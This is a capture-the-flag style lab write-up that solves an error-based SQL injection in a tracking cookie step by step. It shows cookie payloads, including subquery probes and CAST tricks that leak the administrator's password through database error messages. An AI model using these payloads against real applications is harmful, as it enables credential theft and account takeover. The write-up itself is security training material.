# Lab: Visible error-based SQL injection
This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account.

## Solution

### Information gathering
At first we can test out the vulnerability and confirm the existence of the table 'users' and the username 'administrator'.

Adding a tick to the content of the cookie gives us an error:
```
TrackingId=IeRhAtOxNT0AuPb2'
```
```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'IeRhAtOxNT0AuPb2''. Expected  char
```

Using the following query results in no error. So probably we have no Oracle database:
```
TrackingId=IeRhAtOxNT0AuPb2'||(select null)||'
```

We can also verify that the query runs correct by checking for a non existing table:
```
TrackingId=IeRhAtOxNT0AuPb2'||(select null from test)||'
```
This will produce the following error message:
```
ERROR: relation "test" does not exist Position: 73
```

To confirm the existence of the 'users' table we can just query the table:
```
TrackingId=IeRhAtOxNT0AuPb2'||(select null from users)||'
```
We get an error:
```
ERROR: more than one row returned by a subquery used as an expression
```
This error tells us, that the answer to the query contains multiple rows. So the table exists.

If we limit the query to only one row we get no error:
```
TrackingId=IeRhAtOxNT0AuPb2'||(select null from users limit 1)||'
```

The next step is to comfirm the username 'administrator'. For that we have to use a conditional error. For example this one:
```
TrackingId=IeRhAtOxNT0AuPb2'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
```
But we get an error:
```
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = '2Dea5evkp3l2nR4B'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0)'. Expected  char
```

Seems like there is a character limit. We can also verify this by modifying the query:
```
TrackingId='||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'
```
```
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = ''||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END F'. Expected  char
```

### Cast
At this point we remember a part of the description in relation to the usage of `CAST`: _This type of query may also be useful in cases where you're unable to trigger conditional responses because of a character limit imposed on the query._

`CAST` converts one data type into another. If it results in an error, for example because of a bad conversion, it can reveal the data in the error message.

So using `CAST` and shorten the query will probably help us at this point:
```
TrackingId='||cast((select password from users limit 1) as int)||'
```
The error message seems like a password, that we are looking for:
```
ERROR: invalid input syntax for type integer: "h6wrphwn9z1i1l4qa59m"
```

To get the related user to that password we have to adjust the column:
```
TrackingId='||cast((select username from users limit 1) as int)||'
```
```
ERROR: invalid input syntax for type integer: "administrator"
```
The user is actually the administrator!

Aswell we can use the following syntax:
```
TrackingId=' and cast((select username from users limit 1) as int)=1 --
TrackingId=' and cast((select password from users limit 1) as int)=1 --
```

Logging in with those credentials will solve the lab.
